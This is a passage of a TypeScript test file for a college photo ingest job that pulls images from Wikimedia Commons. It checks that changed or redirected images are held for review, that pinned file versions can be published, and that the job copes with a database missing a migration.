  assert.ok(out.errors.some((e) => /re-check/.test(e)));
});

test("bypass: pinning the file Wikidata already shows doesn't let a version uploaded yesterday through", async () => {
  const v1 = await colgateV1();
  const s = fakeStore({ colleges: REVIEW_COLLEGES, stored: [v1] });
  const out = await runCollegePhotoIngest(s.store, reviewDeps(new Map([[190099, "File:Colgate Memorial Chapel.jpg"]])).deps, log, { only: [190099], now: day(0) });
  assert.deepEqual(out.review.map((r) => [r.action, r.source, r.reasons]), [["held-replace", "pick", ["file-recent", "replacement"]]]);
  assert.equal(s.rows.get("c-colgate"), v1);
  // The team can still publish it at once, by pinning the version it looked at.
  const v2 = await sha1Of("File:Colgate Memorial Chapel.jpg#v2");
  const pinned = await runCollegePhotoIngest(s.store, reviewDeps(new Map([[190099, { title: "File:Colgate Memorial Chapel.jpg", sha1: v2 }]])).deps, log, { only: [190099], now: day(0) });
  assert.equal(pinned.counts.replaced, 1);
  assert.equal((s.rows.get("c-colgate") as PhotoRow).commons_sha1, v2);
  // A pin the file no longer matches holds, and keeps what is shown.
  const stale = await runCollegePhotoIngest(s.store, reviewDeps(new Map([[190099, { title: "File:Colgate Memorial Chapel.jpg", sha1: "1".repeat(40) }]])).deps, log, { only: [190099], now: day(0) });
  assert.deepEqual(stale.review.map((r) => r.reasons), [["pick-changed"]]);
  assert.equal((s.rows.get("c-colgate") as PhotoRow).commons_sha1, v2);
});

test("bypass: a picked title that now redirects is held for the team, not published", async () => {
  const s = fakeStore();
  const picks: Picks = new Map([[215062, "File:College Hall Penn old name.jpg"]]);
  const out = await runCollegePhotoIngest(s.store, fakeDeps({ picks }).deps, log, { only: [215062] });
  assert.equal(s.rows.has("c-penn"), false);
  assert.deepEqual(out.review.map((r) => [r.source, r.reasons]), [["pick", ["pick-redirected"]]]);
});

test("bypass: a candidate reverted and re-applied just before the next run starts its wait again", async () => {
  const v1 = await colgateV1();
  const v2 = await sha1Of("File:Colgate Memorial Chapel.jpg#v2");
  const { candidateTextHash } = await import("../../src/lib/ingest/collegePhotos.js");
  // Seen by a run a month ago; the fixtures' version 2 was uploaded (again) on 2026-10-14.
  const s = fakeStore({
    colleges: REVIEW_COLLEGES,
    stored: [v1],
    candidates: [{
      college_id: "c-colgate", source: "wikidata", commons_title: "File:Colgate Memorial Chapel.jpg", commons_sha1: v2,
      text_hash: candidateTextHash({ credit: "Chapel Photographer", license: "CC BY-SA 4.0", licenseUrl: "https://creativecommons.org/licenses/by-sa/4.0" }),
      reasons: ["replacement"], first_seen_at: "2026-09-14T00:00:00.000Z", last_seen_at: "2026-09-14T00:00:00.000Z",
    }],
  });
  const out = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [190099], now: day(0) });
  assert.equal(out.counts.confirmed, undefined, "the September sighting doesn't count: the file changed after it");
  assert.equal(s.rows.get("c-colgate"), v1);
  assert.equal(s.queue!.get("c-colgate")!.first_seen_at, "2026-10-15T00:00:00.000Z", "the wait starts again");
  // Held right after that upload and unchanged since, the same candidate is confirmed a week on.
  const later = await runCollegePhotoIngest(s.store, reviewDeps().deps, log, { only: [190099], now: day(8) });
  assert.equal(later.counts.confirmed, 1);
  assert.equal((s.rows.get("c-colgate") as PhotoRow).commons_sha1, v2);
});

test("the real store before 20261024000071: no review queue (null), and the run's row finished without its counts", async () => {
  // A stand-in for the PostgREST client answering as a database without the migration.
  const updates: Record<string, unknown>[] = [];
  const svc = {
    from(table: string) {
      const q = {
        select: () => q,
        order: () => q,
        range: async () =>
          table === "college_photo_candidates"
            ? { data: null, error: { code: "PGRST205", message: "Could not find the table 'public.college_photo_candidates'" } }
            : { data: [], error: null },
        update(row: Record<string, unknown>) {
          updates.push(row);
          return {
            eq: async () =>
              "counts" in row ? { error: { code: "PGRST204", message: "Could not find the 'counts' column of 'ingest_runs'" } } : { error: null },
          };
        },
      };
      return q;
    },
  };
  const store = supabasePhotoStore(svc as unknown as Parameters<typeof supabasePhotoStore>[0]);
  assert.equal(await store.candidates(), null);
  await store.finishRun("run1", { status: "succeeded", rows_upserted: 1, rows_skipped: 0, errors: [], duration_ms: 5, counts: { added: 1 } });
  assert.equal(updates.length, 2, "tried with the counts, then without");
  assert.equal("counts" in updates[1]!, false);
  assert.equal(updates[1]!.status, "succeeded");
});
